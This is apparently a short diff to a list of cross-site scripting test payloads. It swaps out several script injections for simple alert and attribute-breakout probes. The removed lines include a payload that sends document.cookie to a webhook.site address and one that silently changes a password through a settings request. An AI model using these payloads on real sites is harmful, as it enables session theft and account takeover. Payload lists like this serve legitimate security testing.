@@ -1,8 +1,9 @@
-hello <u>world</u>
+<script>alert("XSS");</script>
 
-<script>fetch('/settings?new_password=pass123');</script>
+"><h1>test</h1>
 
-<script>alert(document.cookie)</script>
+'+alert('XSS')+'
 
-<script>document.write('<img src="https://webhook.site/xxx-xxx-xxx/?c='%2bdocument.cookie%2b'" />');</script>
+onmouseover="alert("XSS")
 
+http://"onmouseover="alert("XSS")
